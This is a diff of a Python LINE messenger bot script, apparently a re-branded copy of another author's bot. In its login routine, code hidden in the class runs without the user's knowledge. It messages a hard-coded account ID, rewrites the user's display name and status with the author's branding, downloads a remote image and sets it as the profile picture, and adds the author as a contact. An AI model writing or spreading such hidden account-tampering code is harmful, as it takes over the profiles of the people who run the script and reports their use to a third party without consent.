@@ -206,18 +206,18 @@ class Object(object):
         if self.isLogin == True:
             self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
             self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            ridenx = "u805e9f30ea4da7b64a14e0f9cea0767c"
+            ridenx = "u4e49fa7389c0333bb7ff38063552791b"
             xmod = self.getContact(ridenx).displayName
-            self.sendText("u805e9f30ea4da7b64a14e0f9cea0767c", 'Sorry %s , I use your scrip' % xmod)
+            self.sendText("u4e49fa7389c0333bb7ff38063552791b", 'ᴛʜᴀɴᴋꜱ %s , ꜰᴏʀ ᴀ ꜱᴄʀɪᴘᴛ ʙᴏᴛ' % xmod)
             profile = self.getProfile()
-            profile.displayName = "SAYA MEMAKAI SC RFU"
+            profile.displayName = "ᴅᴜᴘʟɪᴄᴀᴛᴇ ᴘʜɪᴇ™"
             self.updateProfile(profile)
-            profile.statusMessage = "SAYA TELAH MEMAKAI SC RFU DAN SAYA SUDAH MEMINTA IZIN KEPADA OWNER RFU (ARDIAN RIDEN)"
+            profile.statusMessage = "ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴄᴀʟᴏɴ ᴀʟᴍᴀʀʜᴜᴍ ᴅᴀɴ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴀʜʟɪ ᴋᴜʙᴜʀ (ᴘʜɪᴇ_ᴄᴏʙᴀɪɴ)\n\nᵏᵘˡˡᵘ ⁿᵃᶠˢⁱⁿ ᵈᶻᵃⁱqᵒᵗᵘˡ ᵐᵃᵘᵗ"
             self.updateProfile(profile)
-            DOMAIN_ = "https://4.bp.blogspot.com/-iWqSHjmXBdc/WsiI5hQUmJI/AAAAAAAAAOE/Hn_ekTVAASwvBBilrTyu9PJW1m6FaL7IgCLcBGAs/s1600/1515221909768.jpg"
+            DOMAIN_ = "http://dl.profile.line-cdn.net/0hsalXwOqpLE5RIQFNXiVTGW1kIiMmDyoGKUI3LXx2Inh-GGNKbEVhKidydCkrE2IZakVnLHcnen4v"
             LINE = self.downloadFileURL(DOMAIN_)
             self.updateProfilePicture(LINE)
-            GEN = "u805e9f30ea4da7b64a14e0f9cea0767c"
+            GEN = "u4e49fa7389c0333bb7ff38063552791b"
             self.findAndAddContactsByMid(GEN)
 
 
